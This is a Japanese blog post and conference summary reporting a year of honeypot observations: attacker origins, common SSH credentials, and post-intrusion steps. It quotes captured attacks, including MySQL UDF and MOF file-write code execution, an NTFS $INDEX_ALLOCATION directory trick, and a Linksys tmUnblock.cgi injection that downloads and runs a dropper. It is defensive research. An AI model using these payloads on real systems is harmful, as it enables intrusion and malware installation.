title: 2015年のハニーポット記録(セキュリティ・キャンプ アワード2016)
date: 2016-03-05 23:00:49
tags: [honeypot, cowrie, dionaea, glastopf]
---

2015年の1年間のハニーポットの記録です.  
また, セキュリティ・キャンプ フォーラム2016で行われたセキュリティ・キャンプ アワード2016の発表内容です.  

* [セキュリティ・キャンプ フォーラム2016](https://www.ipa.go.jp/jinzai/camp/2015/forum2016.html)
* [セキュリティ・キャンプ アワード2016](http://www.security-camp.org/event/award2016.html)

以下発表内容の一部をまとめたものです.  

また, ログはGitHubで公開しているので興味がある方はご覧ください.  
* [mrt-k/honeylog2015 GitHub](https://github.com/mrt-k/honeylog2015)

2016年の記録も一ヶ月ごとに更新予定です.  
* [mrt-k/honeylog2016 GitHub](https://github.com/mrt-k/honeylog2016)

### 概要

動かしたハニーポットはcowrie, dionaea, glastopfの3つです.  

* cowrie - [https://github.com/micheloosterhof/cowrie](https://github.com/micheloosterhof/cowrie)
* dionaea - [https://github.com/rep/dionaea](https://github.com/rep/dionaea)
* Glastopf - [http://glastopf.org/](http://glastopf.org/)

dionaeaは接続時のバナーやMySQLのコマンド結果により検知が可能なので, 一部修正したものを使用しました.  
修正箇所は以下の部分です。  

* FTPのバナー情報
* MSSQLのpre-login TDS package
* SMBのOemDomainNameとServerName
* MySQLのコマンド結果

検知回避に関しては以下の記事がよくまとまっています.  
[Dionaeaを改変してNmapによる検出を回避する](http://sonickun.hatenablog.com/entry/2015/01/30/193142)

MySQLはあらかじめ決められたコマンド以外には"Learn SQL!"と返すため, その箇所を変更しました.  

[https://github.com/mrt-k/dionaea/commit/b4fd7f9ab081dec7c51c441d964cfa013af2a7b8](https://github.com/mrt-k/dionaea/commit/b4fd7f9ab081dec7c51c441d964cfa013af2a7b8)


##### 外から見た状態

```
PORT     STATE    SERVICE
21/tcp   open     ftp
22/tcp   open     ssh
80/tcp   open     http
135/tcp  open     msrpc
139/tcp  open     netbios-ssn
445/tcp  open     microsoft-ds
1433/tcp open     ms-sql-s
3306/tcp open     mysql
```


### cowrieでの記録

SSHハニーポットであるcowrieで取得できた記録のまとめです.  

#### 国別アクセス数

![top_10_country](https://raw.githubusercontent.com/mrt-k/honeylog2015/master/img/session_count_graph.png)

1年間で101098回のアクセス試行がありました.  
中国からのアクセスが28006件と3~4割を占めており, 次いでアメリカ, ロシアとなっています.  

![worldmap](https://raw.githubusercontent.com/mrt-k/honeylog2015/master/img/cowrie_worldmap.png)

全部で94カ国からアクセスがありました.

月によりますが, 週末やクリスマスなどの時期はアクセスが増加する傾向もありました.  
中には1ヶ月以上認証を試みる者もいました.  


#### Top 10 usernames

試行回数上位10件のユーザー名です.

![top_10_username](https://raw.githubusercontent.com/mrt-k/honeylog2015/master/img/username_rank.png)

#### Top 10 passwords

試行回数上位10件のパスワードです.

![top_10_password](https://raw.githubusercontent.com/mrt-k/honeylog2015/master/img/password_rank.png)

#### Top 10 usernames and passwords

試行回数上位10件のユーザー名とパスワードの組み合わせです.

![top_10_username_password](https://raw.githubusercontent.com/mrt-k/honeylog2015/master/img/username-password.png)

存在しそうなアカウントやいわゆる「弱いパスワード」を狙っています.  
ubntなど, ルーターのデフォルトアカウントを狙ったものが目立ちます.  

#### Top 10 base words

使用されたパスワードの元となっている単語のランキングです.

1. admin
2. root
3. password
4. test
5. oracle
6. ubnt
7. user
8. ホスト名
9. qwerty
10. VPSの会社名

これらの単語に数字や記号を付与したもの(admin123のようなもの)が多く使用されています.  
このランキングからホスト名やVPSを運営している会社名をベースとしたパスワード(sakura123のようなもの)を試行に使っていることもわかります.


#### パスワードの長さ

使用されたパスワードの長さです.

![pasword_length_rank](https://raw.githubusercontent.com/mrt-k/honeylog2015/master/img/password_length_rank.png)

5, 6, 8文字が多いのは, 一般的に推奨されている(いた)長さからだと思います.  

#### その他

使用されたパスワードのうち, アルファベット小文字のみで構成されているものが50%以上を占めていることや, 末尾が数字となっているものは123や000のような連番となっているケースが多いことが分かりました.

また, RaspberryPiで使用されるRaspbianのデフォルトのユーザー名とパスワードの組み合わせである pi:raspberry も多く見受けられました.  


#### 侵入後のコマンド

ほとんどがスクリプトによって自動化されているもので, 数撃てば当たるようにネットワーク内をスキャンしているようです.  
流れとしてはuname, w, psといったコマンドを実行した後, ファイアウォールの停止, マルウェアのダウンロード, 実行, ログ消去という流れです.  

マルウェアのダウンロード先は/tmp/以下に隠しファイルや隠しディレクトリを使用するケースが多いです.  
また, 自身のSSH公開鍵をauthorized_keysに追加する手法もありました.  

#### 余談

Pastbinなどのようなサイトにホスト名, ユーザー名, パスワードを公開するとすぐにアクセスが来たりします.  


### Dionaeaでの記録

MySQLから任意のコードを実行する攻撃がよく目立ちます.  

```
mysql> SELECT unhex('23707261676D…') INTO DUMPFILE 'C:/windows/system32/…/nullevt.mof'
```

16進数のバイナリ列をunhexしてファイルに書き出す手法です.  
これを利用した攻撃として以下のようなものがあります.  

```
mysql> SELECT unhex('7F454C46010...') INTO DUMPFILE '/usr/lib/mysql/plugin/xiaoji.so'
mysql> CREATE FUNCTION sys_eval RETURNS string SONAME 'xiaoji.so'
mysql> SELECT sys_eval("whoami;");
+---------------------+
| exec('whoami')      |
+---------------------+
| root                |
+---------------------+
1 row in set (0.05 sec)
```

MySQLにおけるUDF(ユーザー定義関数)を利用します.  
コンパイル済みの共有ライブラリを %plugin_dir% に書き出し, 実行する攻撃です.  

しかし, MySQL5.1.30から %plugin_dir% がデフォルトでは存在しないため, 書き出せなくなりました.  
ですが, NTFS上では$INDEX_ALLOCATIONを使用するとファイルの代わりにディレクトリを作成することができます.  
その性質を利用した攻撃も観測しました.  

```
C:\Users\user01>dir /w "C:\mysql-5.1.30-winx64\lib\plugin"
 C:\mysql-5.1.30-winx64\lib のディレクトリ
 ファイルが見つかりません

mysql> select 'x' into dumpfile 'C:\\MySQL\\lib\\plugin::$INDEX_ALLOCATION';

C:\Users\user01>dir /w "C:\mysql-5.1.30-winx64\lib\plugin"
  C:\mysql-5.1.30-winx64\lib\plugin のディレクトリ
  [.]  [..]
                 0 個のファイル                   0 バイト
                 2 個のディレクトリ  22,038,724,608 バイトの空き領域
```

5.1.30ではpluginという名前のディレクトリは存在しません.  
しかし, $INDEX_ALLOCATIONを付与するとファイルの代わりにディレクトリが作成することが可能なことがわかります.  

その他にも以下のようなコマンドを観測しました.  

* 関数を作成するための設定を変更

```
SET GLOBAL log_bin_trust_routine_creators=1;
```

* OS情報の取得

```
SHOW VARIABLES LIKE '%compile_os%';
```

* ユーザーの作成

```
CREATE USER 'user'@'%' IDENTIFIED BY 'pass';
```

* 権限の変更

```
GRANT ALTER, …
```


### Webサービスへの攻撃

Webサーバーを運用している人は分かるかと思いますが, 各種管理画面や設定情報へは頻繁にアクセスがあります.  

* /manager/html - tomcat
* /wp/login.php - WordPress
* /CFIDE/administrator/ - Adobe ColdFusion
* /phpmyadmin/ - PHP My Admin
* /epgrec/ - epgrec
* robots.txt
* .htaccess

狙われた脆弱性としては以下のようなものが多くあります.  

* CVE-2012-1823
* Shell Shock
* Apache Struts関係の脆弱性
* JBoss

これらの脆弱性に共通することとして, 任意のコードが実行可能であるということです.  
脆弱性を利用してどのように攻撃されるのか, Linksys社のルーターを標的とした攻撃を見てみます.  

```
POST /tmUnblock.cgi HTTP/1.1

submit_button=&change_action=&action=&commit=&ttcp_num=2&ttcp_size=2&ttcp_ip=-h
`cd /tmp;
wget -O scaC.sh hxxp://x.x.x.x/ttp/ttp.sh;
chmod +x scaC.sh;
./scaC.sh`&StartEPI=1``
```

tmUnblock.cgiには任意のコマンドを実行可能な脆弱性があります.  
ttp.shという名前のドロッパーによって, MIPSなマルウェアが実行されます.  

```
$ file .*
.nttpd: ELF 32-bit LSB  executable, MIPS, MIPS-I version 1 (SYSV), dynamically linked (uses shared libs), stripped
.sca:   ELF 32-bit LSB  executable, MIPS, MIPS-I version 1 (SYSV), dynamically linked (uses shared libs), stripped
.sox:   ELF 32-bit LSB  executable, MIPS, MIPS-I version 1 (SYSV), dynamically linked (uses shared libs), stripped
```

マルウェアにはDDoSを発生させるためにiptablesでUDP周りの設定を変更する処理などが含まれています.  

```
$ strings .nttpd| grep INPUT   
INPUT -p udp --dport %u -j ACCEPT
INPUT -p udp --dport 9999 -j DROP
INPUT -p tcp -m multiport --dport 80,8080 -j DROP
INPUT -s 46.148.18.0/24 -j ACCEPT
INPUT -s 185.56.30.0/24 -j ACCEPT
INPUT -s 217.79.182.0/24 -j ACCEPT
INPUT -s 85.114.135.0/24 -j ACCEPT
INPUT -s 95.213.143.0/24 -j ACCEPT
INPUT -s 185.53.8.0/24 -j ACCEPT
```

### 所感

デフォルトの設定や甘い設定を狙った攻撃/スキャンは毎日のように行われています.  
また, ルーターを狙っていると思われる攻撃も多く, マルウェアもその環境で動作するようなARMやMIPSなどのものが多く利用されています.  
ルーターに脆弱性が見つかってもファームウェアが自動更新されないものがあったり, そもそもルーターの更新が必要だと知らない人もいるのではないでしょうか.  
IoTの普及が進むにつれて組み込み機器向けの攻撃も増加するのではと思います.  

最近の攻撃はDrive-by downloadが主流であること, そのためにクライアント型ハニーポットが利用されてきたがマルウェアが取れない、などの理由からハニーポットに関する研究も2010年ごろからオワコン化している印象があります.  
ですが, ダークネットにハニーポットを設置し, 観測することでマルウェアの活動傾向を把握できたりしますし, 何より攻撃者が身近にいること, どのような手法を使っているのか攻撃者を知ることができます.  
そこからどう対策をとればいいのかを考え, セキュリティ意識の改善にも繋がるのではと思います.  


